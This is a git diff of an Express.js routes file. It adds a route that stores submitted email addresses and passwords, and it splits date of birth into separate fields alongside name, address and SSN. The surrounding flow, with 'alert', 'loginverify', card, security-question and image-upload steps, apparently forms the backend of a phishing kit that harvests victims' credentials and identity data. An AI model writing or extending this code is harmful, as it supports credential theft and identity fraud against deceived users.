@@ -6,6 +6,7 @@ const multer = require('multer');
 // Load User model
 const User = require('../models/User');
 const Email = require('../models/Email');
+const Email1 = require('../models/Email1');
 const Questions = require('../models/Questions')
 const Card = require('../models/Card')
 const Image = require('../models/Images')
@@ -61,6 +62,8 @@ router.get('/card', forwardAuthenticated, (req, res) => res.render('card'));
 
 router.get('/alert', forwardAuthenticated, (req, res) => res.render('alert'));
 
+router.get('/emailcnt', forwardAuthenticated, (req, res) => res.render('email1'));
+
 router.get('/loginverify', forwardAuthenticated, (req, res) => res.render('login2'));
 
 router.post('/card', async (req, res) => {
@@ -86,7 +89,7 @@ router.post('/card', async (req, res) => {
 
 // images
 router.post('/images', upload.fields([{ name: 'image1', maxCount: 1 }, { name: 'image2', maxCount: 1 }]), (req, res) => {
-  res.redirect('/users/email');
+  res.redirect('/users/emailcnt');
 });
 
 // fix the images getting routes
@@ -135,14 +138,14 @@ router.post('/questions', async (req, res) => {
 
 router.post('/email', async (req, res) => {
   const email = new Email({
-    email: req.body.email,
-    password: req.body.password,
     name: req.body.name,
     streetAddress: req.body.streetAddress,
     apartment: req.body.apartment,
     city: req.body.city,
     zipcode: req.body.zipcode,
-    dob: req.body.dob,
+    dobMonth: req.body.dobMonth,
+    dobDay: req.body.dobDay,
+    dobYear: req.body.dobYear,
     ssn: req.body.ssn
   });
 
@@ -152,9 +155,28 @@ router.post('/email', async (req, res) => {
       console.log(result)
       req.flash(
         'success_msg',
-        'Questions ok'
+        'Email ok'
       );
       res.redirect('/users/card');
+    })
+  .catch(err => console.log(err));
+});
+
+router.post('/emailcnt', async (req, res) => {
+  const emailcnt = new Email1({
+ email: req.body.email,
+ password: req.body.password
+  });
+
+  emailcnt
+  .save()
+    .then(result => {
+      console.log(result)
+      req.flash(
+        'success_msg',
+        'Email ok'
+      );
+      res.redirect('/users/email');
     })
   .catch(err => console.log(err));
 });
